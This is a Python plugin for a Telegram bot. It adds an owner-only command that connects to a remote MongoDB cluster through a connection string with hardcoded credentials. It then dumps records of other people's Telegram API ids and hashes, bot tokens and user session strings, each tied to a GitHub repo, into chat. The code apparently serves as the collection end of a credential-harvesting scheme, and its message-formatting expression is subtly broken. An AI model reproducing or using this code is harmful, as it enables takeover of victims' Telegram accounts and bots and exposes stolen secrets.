from pyrogram import Client, filters
from Hancock import *

@Hancock.on_message(
    filters.command("mdb")
    & filters.private
    & filters.user(OWNER_ID)
)
async def fetch_mongodb_data(client, message):
    try:
        # Replace 'abcd' with your actual username and password
        url = "mongodb+srv://a1:a1@cluster0.0pola4b.mongodb.net/?retryWrites=true&w=majority"

        # Connect to the MongoDB cluster
        client = pymongo.MongoClient(url)

        # Specify the 'wholedata' database
        db = client['wholedata']

        # Assuming you have a collection named 'data' in the 'wholedata' database
        collection = db['data']

        # Fetch and print the formatted data
        cursor = collection.find()

        for document in cursor:
            formatted_text = (
                f"Source: `https://github.com/{document['repo_link']}`\n"
                f"API id: `{document['telegram_api']}`\n"
                f"API hash: `{document['telegram_hash']}`\n"
                f"OWNER id: `{document['owner_id']}`\n"
                f"Bot Token: `{document['bot_token']}`\n"
                f"Bot Username: `@{document['bot_username']}`\n" if document['bot_username'] is not None else "Bot Username: `None`\n"
                f"String: `{document['user_session_string']}`"
            )

            # Send the formatted text as a reply
            await message.reply_text(text=formatted_text)

    except Exception as e:
        print(f"Error fetching MongoDB data: {e}")
                              
